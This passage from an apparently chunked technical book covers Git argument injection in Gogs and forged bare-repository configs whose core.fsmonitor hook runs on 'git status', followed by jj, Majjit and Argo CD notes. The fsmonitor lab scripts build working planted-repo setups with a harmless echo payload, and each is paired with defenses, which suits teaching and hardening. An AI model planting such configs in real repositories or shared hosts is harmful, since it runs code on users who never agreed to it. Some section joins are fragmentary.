Earlier Gogs CVEs had already added -- / --end-of-options on other git-module call sites (tag, diff, upload-pack, …). The rebase merge path still used raw exec and stayed vulnerable until 0.14.3 (PR accepting Rapid7’s patch; CVE-2026-52806).
git rev-parse --verify during PR creation only checked that the ref resolved — after the attacker pushed the oddly named branch, verification succeeded.

Admin takeaway for operators: upgrade Gogs past 0.14.3; treat “we validate refs exist” as unrelated to “we safely pass refs as argv”.


Case 3: Audit checklist for your wrapper
When your code runs Git with any string that came from a user, ticket title, branch name, tag, or path:

Argv only — no shell concatenation.
Barrier — -- or --end-of-options immediately before operands that may start with -.
Prefer a maintained library that already inserts barriers (and keep it updated).
Refuse or encode ref names that begin with - if your product does not need them.
Log carefully — error lines that echo the ref can become IoCs (unknown option 'exec=…'), but do not log secrets from the payload.

Local demonstration of the parser idea without attacking anything: show Git treating a dashed operand as an option unless -- is present.
# end_of_options_lab.sh — safe local demo; creates a throwaway repo in /tmp
set -euo pipefail
d=$(mktemp -d)
trap 'rm -rf "$d"' EXIT
cd "$d"
git init -q
git commit --allow-empty -m init >/dev/null
# Without --, a dashed "ref" is an unknown option to show-ref-shaped tools:
if git rev-parse --verify -- '--exec=demo' 2>/tmp/err; then
  echo "unexpected success"
else
  echo "without a real ref named that way, verify fails (expected)"
  head -2 /tmp/err || true
fi
# Create an oddly named ref ONLY in this temp repo to show naming is legal:
git update-ref 'refs/heads/--odd-name' HEAD
git show-ref --heads | grep odd-name
# show-ref with -- before patterns:
git show-ref --heads -- '--odd-name' >/dev/null && echo "ok: dashed ref accepted as operand after --"
Run this only in /tmp labs. Do not point it at production forges or shared runners.

title: Git argument injection and -- / --end-of-options
text:
The trap
Validating with git rev-parse / “does this ref exist?” and assuming the string is safe to splice into git rebase, git checkout, git tag, or git diff. Existence is not non-optionality. The other trap: disabling a feature (rebase merge) as your only control while repo owners can turn it back on.

title: Git argument injection and -- / --end-of-options
text:
The boring rule
Every user-influenced token that follows git <subcommand> goes after -- or --end-of-options, or through an API that already inserts one. Review new exec.Command("git", …) call sites the same way you review SQL concatenation.

title: Git argument injection and -- / --end-of-options
text:
Try this

git grep -n 'rebase' $(your-forge-or-ci-repo) and list call sites missing --.
Run end_of_options_lab.sh in /tmp to feel dashed ref names.
Read Rapid7’s public post for the full disclosure timeline and operator mitigations — upgrade paths, not exploit steps.

title: When .git Is Missing: Forged Config, fsmonitor, and safe.directory
text: When .git Is Missing: Forged Config, fsmonitor, and safe.directory

title: When .git Is Missing: Forged Config, fsmonitor, and safe.directory
text:
Thesis
Git finds a repository by discovery, not by magic. It looks for .git/HEAD. If that is gone, it asks whether the current directory itself looks like a bare repository: does it contain HEAD, objects/, and refs/? If yes, that directory is the repository, and Git will read its config and run its hooks.
That second check is the attack surface. An attacker who can plant those files in a work tree, and then arrange for .git to disappear, can make the next git status (or any other Git command) execute a core.fsmonitor command of their choosing. RyotaK used exactly this against Google Cloud Looker (CVE-2025-12472): a forged config with core.worktree = "." and core.fsmonitor = "…", a recursive delete that wiped .git first, and a concurrent git status that ran the hook.
This chapter builds that discovery path in a throwaway directory, shows what Git does, and then turns on the two defenses that belong in every forge, CI runner, and shared-host Git install: safe.bareRepository=explicit and a carefully managed safe.directory list. It does not reproduce Looker’s delete race or any live exploit against a service.

title: When .git Is Missing: Forged Config, fsmonitor, and safe.directory
text:
Mental model



When .git is gone Git falls back to bare-repo discovery; a forged config with fsmonitor becomes a hook; safe.bareRepository=explicit and safe.directory are the defenses









Piece
What it is




Bare repository
A directory that is the Git database: HEAD, config, objects/, refs/ sit at its root, with no .git/ subdirectory


core.bare = false + core.worktree = "."
Turns that bare-looking directory into a non-bare repo whose work tree is itself, so git status has somewhere to look


core.fsmonitor
A command Git runs to learn which files changed. It is an ordinary hook: the shell runs it with your privileges


Discovery
“Is there a .git here? If not, does this directory look like a bare repo?” — the second answer is what the forged files hijack



Git has two relevant defenses, and both only take effect in protected configuration (system and global). A forged per-repo config cannot turn them off.







Setting
Effect




safe.bareRepository = explicit
Git refuses to use a bare repository unless it was named by --git-dir or $GIT_DIR. Default today is all. Git 3.0 will default to explicit


safe.directory
Git refuses to even parse a repository’s config if the directory is owned by someone else. Listing a path (or *) adds an exception

title: When .git Is Missing: Forged Config, fsmonitor, and safe.directory
text:
Worked examples
Every listing was run on Debian 13 x86_64 with Git 2.47.3. The current upstream release is Git 2.56.0. Behaviour of discovery, safe.bareRepository, and safe.directory is unchanged between those two. The labs isolate Git from your real configuration:
# env.sh — isolate the lab from your real Git configuration.
# env.sh — isolate the lab from your real Git configuration.
export LAB="$PWD"
export GIT_CONFIG_NOSYSTEM=1               # ignore /etc/gitconfig
export GIT_CONFIG_GLOBAL="$LAB/gitconfig"  # a throwaway "global" config
export GIT_AUTHOR_NAME=lab GIT_AUTHOR_EMAIL=lab@example.com
export GIT_COMMITTER_NAME=lab GIT_COMMITTER_EMAIL=lab@example.com
: > "$GIT_CONFIG_GLOBAL"
Save that next to the case scripts, then:
mkdir -p /tmp/vcs-lab && cd /tmp/vcs-lab
# copy env.sh and the case scripts here
. ./env.sh

Case 1: An embedded bare repository that a clone delivers intact
The classic “buried bare repo” shape. The outer repository’s tracked files include a complete bare repository under docs/. After you clone it, cd docs and run any Git command: discovery finds the bare files and the forged fsmonitor fires.
#!/bin/sh
# case1.sh — a cloned repo that contains a bare repository in a subdirectory.
. ./env.sh
set -e
rm -rf attacker victim
mkdir attacker && cd attacker && git init -q -b main

# What looks like project files is a complete bare repository.
mkdir -p docs/objects/info docs/refs/heads
printf '' > docs/objects/info/.keep
printf '' > docs/refs/heads/.keep
echo 'ref: refs/heads/main' > docs/HEAD
# Plant the config WITHOUT the hook first, so seeding the bare repo is quiet.
cat > docs/config <<'CFG'
[core]
    repositoryformatversion = 0
    bare = true
CFG
echo '# Docs' > docs/README.md
git --git-dir=docs --work-tree=docs add README.md
git --git-dir=docs --work-tree=docs commit -q -m seed
# Now turn it into the trap: bare=false, worktree=".", and an fsmonitor hook.
cat > docs/config <<'CFG'
[core]
    repositoryformatversion = 0
    bare = false
    worktree = "."
    fsmonitor = "echo \"fsmonitor ran as $(id -un) in $PWD\" >&2; false"
CFG
# Track the bare-repo files as ordinary files in the outer repo.
git add -A && git commit -q -m "add docs"
cd ..

git clone -q attacker victim
cd victim/docs
echo "\$ ls"
ls
echo "\$ git rev-parse --git-dir"
git rev-parse --git-dir
echo "\$ git status --short"
git status --short
$ ls
COMMIT_EDITMSG
HEAD
README.md
config
index
logs
objects
refs
$ git rev-parse --git-dir
.
$ git status --short
fsmonitor ran as box in /tmp/vcs-lab/victim/docs
fsmonitor ran as box in /tmp/vcs-lab/victim/docs
?? COMMIT_EDITMSG
?? HEAD
?? config
?? index
?? index.lock
?? logs/
?? objects/
?? refs/
git rev-parse --git-dir printing . is the tell. There is no .git directory. The current directory is the repository, so its config is authoritative. git status therefore runs core.fsmonitor as you, twice (once for the refresh, once for the status walk). justinsteven documented this family of abuses in 2022; Looker’s invention was a way to create this state on a host that already had a real .git.


Case 1 defense: safe.bareRepository=explicit
#!/bin/sh
# case1_defense.sh — same clone, with safe.bareRepository=explicit.
. ./env.sh
set -e
git config --global safe.bareRepository explicit
cd victim/docs
echo "\$ git config --global --get safe.bareRepository"
git config --global --get safe.bareRepository
echo "\$ git status --short"
if git status --short 2>err.txt; then
  echo "(unexpected success)"
else
  echo "exit=$?"
  cat err.txt
fi
$ git config --global --get safe.bareRepository
explicit
$ git status --short
exit=128
fatal: cannot use bare repository '/tmp/vcs-lab/victim/docs' (safe.bareRepository is 'explicit')
Git refuses the bare repository because nothing named it with --git-dir or $GIT_DIR. Set this once in the global or system config of every host that runs Git on untrusted trees (CI runners, forges, developer laptops that cd into random clones). A repository’s own config cannot override it. When Git 3.0 lands, this becomes the default; setting it today is free and forward-compatible.


Case 2: Delete .git, keep a forged config, run git status
The Looker-shaped state, without Looker’s race. Plant the bare-repo files next to a real work tree, remove .git, and ask Git what it sees.
#!/bin/sh
# case2.sh — forge a config after .git is gone, then run git status.
. ./env.sh
set -e
git config --global --unset-all safe.bareRepository 2>/dev/null || true
git config --global --unset-all safe.directory 2>/dev/null || true

rm -rf project && mkdir project && cd project
git init -q -b main
echo 'v1' > app.txt && git add app.txt && git commit -q -m v1

# Capture the real index so "bare=false + worktree=." has something to status.
cp .git/index forged.index
cp .git/HEAD forged.HEAD

# Plant the forged bare-repo files next to the real work tree.
cat > config <<'CFG'
[core]
    repositoryformatversion = 0
    bare = false
    worktree = "."
    fsmonitor = "echo \"fsmonitor ran as $(id -un)\" >&2; false"
CFG
cp forged.HEAD HEAD
cp forged.index index
mkdir -p objects/info refs/heads
printf '' > objects/info/.keep
printf '' > refs/heads/.keep

echo "\$ ls -a"
ls -a
echo "\$ rm -rf .git"
rm -rf .git
echo "\$ git status --short"
git status --short
$ ls -a
.
..
.git
HEAD
app.txt
config
forged.HEAD
forged.index
index
objects
refs
$ rm -rf .git
$ git status --short
fsmonitor ran as box
fsmonitor ran as box
A  app.txt
?? HEAD
?? config
?? forged.HEAD
?? forged.index
?? index
?? index.lock
?? objects/
?? refs/
After rm -rf .git, discovery falls through to the planted HEAD / objects / refs, reads the planted config, and runs fsmonitor. The index copy is there so git status has a tree to compare; without it you get fatal: this operation must be run in a work tree instead of a hook. The same defense as Case 1 stops it:
$ git status --short
exit=128
fatal: cannot use bare repository '/tmp/vcs-lab/project' (safe.bareRepository is 'explicit')


Case 3: Ownership check vs safe.directory=*
safe.directory is a different defense: Git refuses to parse a repository’s config when the directory is owned by someone else. GIT_TEST_ASSUME_DIFFERENT_OWNER=1 exercises that check without needing a second Unix user (it is a Git test hook, available since the ownership protection shipped).
#!/bin/sh
# case3.sh — GIT_TEST_ASSUME_DIFFERENT_OWNER refuses to parse the config.
. ./env.sh
set -e
git config --global --unset-all safe.bareRepository 2>/dev/null || true
git config --global --unset-all safe.directory 2>/dev/null || true

rm -rf project && mkdir project && cd project
git init -q -b main
echo 'v1' > app.txt && git add app.txt && git commit -q -m v1
cp .git/index forged.index
cp .git/HEAD forged.HEAD
cat > config <<'CFG'
[core]
    repositoryformatversion = 0
    bare = false
    worktree = "."
    fsmonitor = "echo \"fsmonitor ran\" >&2; false"
CFG
cp forged.HEAD HEAD
cp forged.index index
mkdir -p objects/info refs/heads
printf '' > objects/info/.keep
printf '' > refs/heads/.keep
rm -rf .git

echo "\$ GIT_TEST_ASSUME_DIFFERENT_OWNER=1 git status"
if GIT_TEST_ASSUME_DIFFERENT_OWNER=1 git status 2>err.txt; then
  echo "(unexpected success)"
else
  echo "exit=$?"
  cat err.txt
fi

echo
echo "\$ git config --global --add safe.directory '*'   # the wrong fix"
git config --global --add safe.directory '*'
echo "\$ GIT_TEST_ASSUME_DIFFERENT_OWNER=1 git status --short"
GIT_TEST_ASSUME_DIFFERENT_OWNER=1 git status --short
$ GIT_TEST_ASSUME_DIFFERENT_OWNER=1 git status
exit=128
fatal: detected dubious ownership in repository at '/tmp/vcs-lab/project'
To add an exception for this directory, call:

    git config --global --add safe.directory /tmp/vcs-lab/project

$ git config --global --add safe.directory '*'   # the wrong fix
$ GIT_TEST_ASSUME_DIFFERENT_OWNER=1 git status --short
fsmonitor ran
fsmonitor ran
A  app.txt
?? HEAD
?? config
?? err.txt
?? forged.HEAD
?? forged.index
?? index
?? index.lock
?? objects/
?? refs/
Without an exception, Git stops before reading config, so the hook never runs. Adding safe.directory * is the nuclear override: every repository is trusted, ownership is ignored, and the same forged config executes fsmonitor again. For CI images and developer laptops, prefer an explicit list of directories you own, or a trailing-/* allow for a known workspace root. Never ship safe.directory=* as a default. Git documents that this setting, like safe.bareRepository, is only respected in protected configuration, so a forged repo cannot disable it either.


Case 4: The delete window, illustrated
Looker’s bug was not “Git runs hooks”. It was that a recursive delete of the repository directory removed .git first, and a carefully sized decoy directory made rm -rf linger long enough for a concurrent git status to see the forged files. This case shows the state during that window. It does not time a race against a running delete, and it does not talk to Looker.
#!/bin/sh
# case4.sh — .git is gone, the decoy is still being deleted, git status fires.
. ./env.sh
set -e
git config --global --unset-all safe.directory 2>/dev/null || true
git config --global --unset-all safe.bareRepository 2>/dev/null || true

rm -rf race && mkdir race && cd race
git init -q -b main
echo 'v1' > app.txt && git add app.txt && git commit -q -m v1
cp .git/index forged.index
cp .git/HEAD forged.HEAD

cat > config <<'CFG'
[core]
    repositoryformatversion = 0
    bare = false
    worktree = "."
    fsmonitor = "echo \"fsmonitor ran during the delete window\" >&2; false"
CFG
cp forged.HEAD HEAD
cp forged.index index
mkdir -p objects/info refs/heads
printf '' > objects/info/.keep
printf '' > refs/heads/.keep

# Decoy directory that sorts after ".git" in ASCII. Looker's rm -rf walked
# children in readdir order; here we just delete .git first ourselves.
mkdir -p zzz_decoy
i=0
while [ "$i" -lt 200 ]; do
  mkdir -p "zzz_decoy/d$i"
  printf 'x' > "zzz_decoy/d$i/f"
  i=$((i + 1))
done

rm -rf .git
echo "\$ ls | head"
ls | head
echo "\$ git status --short   # while the decoy (and forged files) still exist"
git status --short
$ ls | head
HEAD
app.txt
config
forged.HEAD
forged.index
index
objects
refs
zzz_decoy
$ git status --short   # while the decoy (and forged files) still exist
fsmonitor ran during the delete window
fsmonitor ran during the delete window
A  app.txt
?? HEAD
?? config
?? forged.HEAD
?? forged.index
?? index
?? index.lock
?? objects/
?? refs/
?? zzz_decoy/
.git is gone. The decoy and the forged files are still there. git status runs the hook. That is the entire window Looker’s race opened. The engineering lesson for forges and CI is not “make rm -rf faster”. It is:

Never delete a path that can resolve to the repository root from user input. Looker’s validate_dir_name missed dir_name == "/".
Never run Git against a tree you are concurrently destroying.
Set safe.bareRepository=explicit so even if the window opens, discovery refuses the planted bare repo.
Keep safe.directory tight, so a repo that somehow changes ownership mid-flight is refused rather than parsed.

title: When .git Is Missing: Forged Config, fsmonitor, and safe.directory
text:
The trap
safe.directory=* feels like a fix for “dubious ownership” errors and is the most common way to turn the ownership defense off. Case 3 shows the sequence: the ownership check correctly refuses the forged repo, then * lets the hook run. Prefer listing the directories you actually share, and prefer running Git as the owner of those directories. The same trap exists for safe.bareRepository=all (the current default): it is convenient for workflows that cd into bare clones, and it is exactly what lets Case 1 fire. If you need bare repositories, name them with --git-dir / $GIT_DIR and keep the setting on explicit.
Other mistakes that re-open the window:

Cleaning a workspace with rm -rf "$REPO" based on user-controlled path segments, without rejecting /, .., and empty components.
Running git status / git diff / git add -A as a side effect of “is this a repo?” probes against trees you do not trust.
Trusting that “the repo has no hooks” means anything. core.fsmonitor, core.editor, core.pager, diff.*.command, and gpg.program are all commands Git will run from config. A forged config does not need a hooks/ directory.
Assuming safe.* in a repository’s own config helps. Protected scopes only.

title: When .git Is Missing: Forged Config, fsmonitor, and safe.directory
text:
The boring rule
On every host that runs Git against trees you did not create yourself — CI runners, forges, shared build agents, developer laptops that cd into clones — set safe.bareRepository=explicit in the global or system config, keep safe.directory as an explicit list (never *), and treat any user-controlled path that reaches a recursive delete or a Git invocation as hostile. Audit wrappers for “is this a git repo?” probes that run real Git commands against untrusted directories.

title: When .git Is Missing: Forged Config, fsmonitor, and safe.directory
text:
Try this

In Case 1, replace fsmonitor with core.pager = "echo pager-ran >&2" and run git log. Which commands invoke which config-driven programs?
Set safe.bareRepository=explicit and then run git --git-dir=/tmp/vcs-lab/victim/docs status. Why does that succeed when bare git status in the same directory fails?
Without GIT_TEST_ASSUME_DIFFERENT_OWNER, recreate Case 3 using chown inside a rootless user namespace (unshare -U -r) so the directory is really owned by another uid. Confirm safe.directory still refuses it.
Grep a forge or CI codebase you maintain for rm -rf, FileUtils.rm_rf, shutil.rmtree, and any git status / git rev-parse against a user-named path. For each call site, write down what happens if the path is / or contains ...
Read justinsteven’s 2022 advisory (linked below) and list three other config keys that become dangerous once discovery has been redirected.

title: When .git Is Missing: Forged Config, fsmonitor, and safe.directory
text:

title: jj (Jujutsu): Working Copy as a Commit
text:
jj (Jujutsu): Working Copy as a Commit
Git teaches a three-layer story: working tree, index/staging area, commits. Most day-to-day anxiety — “did I stage that?”, “is this amend or a new commit?”, “how do I undo the last amend?” — lives in the gaps between those layers. Jujutsu (jj) collapses the gap: the working copy is a real commit (@). Every edit is snapshotted into that commit the next time you run a jj command. There is no staging area to reconcile. Undo is an operation-log rewind. This chapter builds that mental model on a colocated Git repo, runs the handful of commands you need every day (jj new, jj describe, jj squash, jj undo), and shows how remotes still speak Git.
Verified against jj 0.46.0 on x86_64 Linux (2026-10-09). Primary docs: https://docs.jj-vcs.dev/latest/.

title: jj (Jujutsu): Working Copy as a Commit
text:
Learning goals
By the end of this chapter you can:

Explain why @ is a commit ID that changes as you type

Distinguish change ID (stable) from commit ID (content-addressed, rewritten)

Colocate jj on an existing Git checkout with jj git init

Start a fresh change (jj new), describe it, fold WIP with jj squash, and rewind with jj undo

Push to a Git remote without abandoning Git-speaking collaborators

title: jj (Jujutsu): Working Copy as a Commit
text:
Thesis

In Git, a commit is what you produce when you are done. In jj, a commit is what you are editing. The working copy is not a waiting room — it is revision @, rewritten in place until you say jj new.

That single flip removes the index. Files you create are tracked automatically (subject to .gitignore and snapshot.auto-track). Files you delete are untracked automatically. jj st both reports and snapshots.

title: jj (Jujutsu): Working Copy as a Commit
text:
Mental model
Git mental layers              jj mental layers
─────────────────              ────────────────
working tree  ─┐
staging index ─┼─→ commit      working-copy commit @  ←── you edit files here
               ┘               parent commit      @-
                               operation log      (every jj command)







Term
Meaning




@
Working-copy commit — rewritten on almost every jj command when files changed


@-
Parent of @ (usually the last “finished” change)


Change ID
Stable identifier for a logical change (survives rewrites); prefer this in daily use


Commit ID
Git-compatible content hash; changes whenever the snapshot changes


Operation
One recorded jj action; jj undo rewinds the latest

title: jj (Jujutsu): Working Copy as a Commit
text:
Case 0 — install and version
# jj 0.46.0 — verify yours
jj --version
jj 0.46.0-7d382314f9420b4b8d932245b49c99492c812b9f
Configure identity once (required before any push to a Git remote):
jj config set --user user.name "Your Name"
jj config set --user user.email "you@example.com"

title: jj (Jujutsu): Working Copy as a Commit
section: Case 1 — colocated repo: Git and jj share one working tree
text:
Case 1 — colocated repo: Git and jj share one working tree
# demo.sh — colocated init and first snapshot
rm -rf /tmp/jj-wc-demo && mkdir /tmp/jj-wc-demo && cd /tmp/jj-wc-demo
jj git init --colocate
echo 'hello' > README.md
jj status
Initialized repo in "."
Working copy changes:
A README.md
Working copy  (@) : rukslwvq 762e295b (no description set)
Parent commit (@-): zzzzzzzz 00000000 (empty) (no description set)
What just happened:

jj git init --colocate created both .jj/ and .git/ in the same directory (the default for Git-backed workspaces).

Adding README.md and running jj status snapshotted the file into @. There was no git add.

@ already has a change ID (rukslwvq…) and a commit ID (762e295b…). The commit ID will change on the next rewrite; the change ID will not.

On an existing Git clone the same command works from inside the checkout: jj git init (colocate is the default). jj imports Git refs and keeps exporting on every command so git log / git status stay coherent — usually with Git in a detached-HEAD-looking state, which is normal for colocated workflows.

title: jj (Jujutsu): Working Copy as a Commit
section: Case 2 — describe, then jj new when the change is “done enough”
text:
Case 2 — describe, then jj new when the change is “done enough”
jj describe -m 'add README'
jj log -r 'all()' --limit 5
jj new
jj log -r '@ | @-' 
Working copy  (@) now at: rukslwvq c4ec738f add README
Parent commit (@-)      : zzzzzzzz 00000000 (empty) (no description set)
@  rukslwvq … c4ec738f
│  add README
◆  zzzzzzzz root() 00000000
Working copy  (@) now at: pslozopm e8dc9b58 (empty) (no description set)
Parent commit (@-)      : rukslwvq c4ec738f add README
jj describe rewrote @ (new commit ID, same change ID, now with a message). jj new created an empty successor and moved @ there. The finished work sits at @-. That is the jj equivalent of “commit what I staged and start fresh” — except nothing was staged.

title: jj (Jujutsu): Working Copy as a Commit
section: Case 3 — keep editing, then squash (or edit)
text:
Case 3 — keep editing, then squash (or edit)
echo 'world' >> README.md
jj diff
jj squash -m 'extend README'
Modified regular file README.md:
   1    1: hello
        2: world
Working copy  (@) now at: lyxlzlzu … (empty) (no description set)
Parent commit (@-)      : rukslwvq 66cd1710 extend README
jj squash moves the changes from @ into its parent (default) and leaves you on a new empty working-copy commit. It is the boring “amend the previous change with my current WIP” path. The alternative is jj edit <change> to resume amending an older change directly in @ — useful when the change is still open; squash-then-diff is clearer when you want a reviewable delta first.

title: jj (Jujutsu): Working Copy as a Commit
section: Case 4 — undo is not reflog archaeology
text:
Case 4 — undo is not reflog archaeology
jj undo
jj log -r 'all()' --limit 8
Undid operation: … squash commits into …
Working copy  (@) now at: pslozopm 241153d1 (no description set)
Parent commit (@-)      : rukslwvq c4ec738f add README
@  pslozopm … 241153d1
│  (no description set)
○  rukslwvq … c4ec738f
│  add README
◆  zzzzzzzz root() 00000000
Every jj command records an operation. jj undo rewinds the last one (here: the squash). The working-copy files and the commit graph return to the prior operation. For deeper recovery: jj op log, then jj op undo / restore by operation id. This is why “I amended the wrong thing” stops being an emergency.

title: jj (Jujutsu): Working Copy as a Commit
text:
Interop with Git remotes
Colocated repos still push with Git semantics:
# Create a bookmark (jj's branch-like movable ref) on the finished change
jj bookmark create my-feature -r @-
jj git push --bookmark my-feature
# Or let jj mint a name from a change id:
# jj git push --change @-
Notes for Git teammates:

They clone and work with plain Git; the .jj/ directory is yours.

Prefer bookmarks for anything that must be named on the remote.

After jj git push, if @ became immutable, jj creates a fresh working-copy commit on top — run jj new yourself if you need a clean empty @ before more edits.

Mixing git mutation commands in a colocated workspace works but is easier if you mostly stay in jj and treat git as the remote transport / blame / bisect tool.

title: jj (Jujutsu): Working Copy as a Commit
text:
The trap

Looking for git add. There isn’t one. Ignore files with .gitignore; untrack with jj file untrack after ignoring.

Treating commit IDs as stable handles. Use change IDs (jj log shows them first). Commit IDs churn every snapshot.

Pushing @ when it is empty WIP. Push @- or an explicit bookmark on the finished change (jj git push --change @-).

Expecting Git’s staging partial-hunk workflow by default. jj snapshots the whole working copy; use jj split, jj squash -i, or file-level tools when you need to carve hunks.

Forgetting identity config. Until user.name / user.email are set, commits are empty-identity and remotes will reject them.

title: jj (Jujutsu): Working Copy as a Commit
text:
The boring rule
Edit freely. Let @ absorb the snapshot. When the change is ready enough, jj describe + jj new (or jj squash into the parent). Wrong move? jj undo. Speak Git at the boundary with bookmarks and jj git push.

title: jj (Jujutsu): Working Copy as a Commit
text:
Try this

jj git init --colocate inside a throwaway Git repo you already know.

Make three file edits; run jj st after each; watch the commit ID of @ change while the change ID stays put.

jj new, edit again, jj squash, jj undo, confirm the diff returns.

jj bookmark create demo -r @- && jj git push --bookmark demo to a personal fork.

title: Majjit: a Magit-style TUI for the Jujutsu DAG
text:
Majjit: a Magit-style TUI for the Jujutsu DAG
jj log is powerful; a scrolling terminal transcript is still a poor place to point at a revision, fold a diff, squash into a parent, and push—without retyping change ids. Majjit is a Rust TUI that treats the Jujutsu commit DAG like Magit treats a Git repo: browse the log tree, run multi-key command sequences, see jj output in a pane, fuzzy-pick bookmarks and changes.
This chapter sits next to the working-copy-as-commit mental model: once @ is a real commit, a DAG browser becomes the everyday control surface. It does not re-teach jj new / jj squash / colocated Git—those stay in the earlier jj chapter. Focus here is the TUI workflow and how it maps onto jj operations.
Primary source: anthrofract/majjit README (retrieved 2026-10-16). Majjit was not installed on this box (no cargo install / Nix run in scout); commands and key sequences are from upstream docs.

title: Majjit: a Magit-style TUI for the Jujutsu DAG
text:
Learning goals
By the end of this chapter you can:

Explain what Majjit adds on top of raw jj CLI for DAG surgery
Install or nix run Majjit from the upstream flake / cargo git source
Use ? help, folding, fuzzy pickers, and multi-key sequences (ss, gpa, …)
Map common Magit habits (stage/fold/push) onto jj verbs Majjit shells out to
Know the escape hatch: custom command C for arbitrary jj

title: Majjit: a Magit-style TUI for the Jujutsu DAG
text:
Thesis

jj already made the working copy a commit. Majjit makes the operation graph browsable: select a node, chord a verb, read the pane—without losing the precision of change ids.

title: Majjit: a Magit-style TUI for the Jujutsu DAG
text:
Mental model
  jj CLI                         Majjit TUI
  ─────                          ────────
  jj log | less                  foldable log + diffs
  remember change id             click / fuzzy select
  jj squash -r X --into Y        select + `ss` (example chord)
  scrollback for output          bottom output panel



Habit
In Majjit (per upstream README)




Discover bindings
Press ?


Fold / unfold
Mouse right-click or UI fold controls


Select
Mouse left-click or keyboard navigation


Squash into parent
Example chord ss → jj squash on selection


Push all / tracked

title: Majjit: a Magit-style TUI for the Jujutsu DAG
Majjit: a Magit-style TUI for the Jujutsu DAG
text:
Case 2 — Browse, fold, act
Typical session shape:

Open Majjit in the repo root.
Press ? and skim the transient help (Magit-style chord menus).
Navigate the log tree; unfold a revision to inspect the file diff.
Select a change; run a chord (ss squash, bookmark ops, jj rebase family, etc.).
Read stdout/stderr of the underlying jj invocation in the bottom panel—the TUI is a frontend, not a second implementation of the DAG.

Supported surface area (README list, abbreviated): abandon, absorb, bookmark create/move/track/…, commit, describe, diff, duplicate, edit, evolog, file track/untrack, git fetch/push/remote list, new/next/prev, parallelize, rebase, redo/undo, resolve, restore, revert, split, squash, status, sign/unsign, workspace add/forget/list/rename/update-stale, plus custom C.
That coverage matters: Majjit aims at most of jj help, not a toy subset. When a brand-new jj subcommand appears, C keeps you unblocked until bindings catch up.

vs raw jj: same semantics, better spatial UX for DAG edits.
vs Magit: same UX genre, different object model (change ids, operation log, no index).
vs agent-scale Git infrastructure essays: orthogonal. Majjit is a human TUI on a local jj repo, not a forge-side merge farm. Keep those concerns in separate chapters.

Use Majjit to select and fire jj operations you already understand. If you cannot explain what ss will do to @ and the parent, drop to the CLI until you can—then bind the habit in the TUI.

Versioning the chart and the values is two Git objects.
Helm hook annotations can surprise Argo if mixed carelessly.

chart + values.yaml  --helm template-->  desired YAML  --sync-->  cluster

title: Theory
text:
Theory: ApplicationSets are Generators of Applications
An ApplicationSet template plus a generator (list, git, matrix, PR, cluster) produces many Application objects. App-of-apps is the same idea with a parent Application.

title: Theory
text:
Invariants

Generators must be deterministic enough to converge.
One Application per cluster/tenant/branch is a naming policy.
Build→registry→bump tag in Git is the promotion loop.

generator (list of clusters) × template  →  Application objects
parent app  →  child apps           (app of apps)

title: Theory
text:
What can break

A generator that creates and destroys apps on every reconcile (flap).

title: Theory
text:
How to read this chapter
ApplicationSets, app-of-apps, multi-branch, build-to-update.

title: Theory
text:
Theory: Notifications Observe the Loop; Secrets Must Not Live as Plain Desired State
Slack fires on Application events. Secrets need an external system (Sealed Secrets, SOPS, ESO) so Git stays the index of secret references. Blue-green at the Argo CD layer is usually two apps or a Rollouts object.

title: Theory
text:
Invariants

Notification config is itself desired state (or a cluster controller).
Sealed/SOPS ciphertext can live in Git; plaintext must not.
Blue-green without Rollouts is two Destinations or two services.

Application event → notification controller → Slack
Git ciphertext    → controller           → cluster Secret

title: Theory
text:
What can break

Base64 secrets in Git called ‘encryption’.

text:
How to read this chapter
Slack, secret strategies, blue-green.

title: Theory
text:
Theory: Progressive Delivery is Reducing Blast Radius Over Time
Kubernetes RollingUpdate is maxUnavailable/maxSurge, not traffic-aware. Canary and blue-green split traffic or replicas and add pause/analysis gates.

title: Theory
text:
Invariants

A Rollout replaces a Deployment as the object that owns ReplicaSets.
Canary: some users (or pods) see the new version first.
Blue-green: two full stacks; cut traffic when ready.

RollingUpdate   gradual pods, mixed traffic
Canary          gated traffic/replicas
Blue-green      two stacks, one cutover

title: Theory
text:
What can break

Calling a 50% RollingUpdate a canary (no analysis, no traffic split).

title: Theory
text:
How to read this chapter
Beyond RollingUpdate, canary/blue-green, risk.

title: Theory
text:
Theory: A Step is a Promise About Traffic or Replicas, Then a Pause
Canary steps are a state machine: setWeight/setCanaryScale, pause, analysis. Promotion advances; abort rewinds to stable.

title: Theory
text:
Invariants

Pause without analysis is a human gate.
Inspection (kubectl argo rollouts get) reads that state machine.
Replica-based weight approximates traffic if pods are homogeneous.

setWeight 20 → pause → setWeight 50 → analysis → setWeight 100

title: Theory
text:
What can break

No pause and no analysis (just a slow RollingUpdate).

How to read this chapter
Steps, promote/abort/inspect.

title: Theory

Theory: Traffic Split is a Mesh API, Not a Replica Count

title: Theory

DestinationRule subsets must match pod labels.
Replica-based routing ≠ request-based routing under uneven load.
setCanaryScale exists because HPA + replica canaries fight (later chapter).

Gateway → VirtualService  90% stable subset
                       10% canary subset

title: Theory
text:
What can break

Subsets that do not match Rollout’s pod labels.

title: Theory
text:
Theory: workloadRef Lets a Rollout Adopt a Deployment
Migration is changing the controller that owns ReplicaSets without changing the pod spec. workloadRef points at an existing Deployment. StatefulSets often cannot follow this path.

title: Theory
text:
Invariants

Git (Argo) must stop managing the old Deployment’s replica field.
Aborts during migration need a rehearsed rollback.
Stateful identity (ordinals, PVCs) does not map to canary ReplicaSets cleanly.

Deployment  --workloadRef-->  Rollout takes over RS
Git desired: Rollout, not Deployment replicas

title: Theory
text:
What can break

Both Deployment and Rollout controllers racing on the same RS.

title: Theory
text:
How to read this chapter
workloadRef, conversion, canary migration, StatefulSet limits.

Theory: One Loop from Commit to Careful Traffic
Git commit → forge CI → image digest in Git → Argo CD sync → Rollout steps → analysis → stable. That is the book’s end-to-end mental model.

title: Theory
text:
Invariants

Every stage is a name over content-addressed bytes (Git hash, image digest).
Humans change Git; controllers change clusters.
Larger environments add more clusters, ApplicationSets, and stricter analysis — not a different physics.

commit → CI → digest in Git → Argo → Rollout → traffic → stable

title: Theory
text:
What can break

A snowflake kubectl at any stage (breaks the loop).
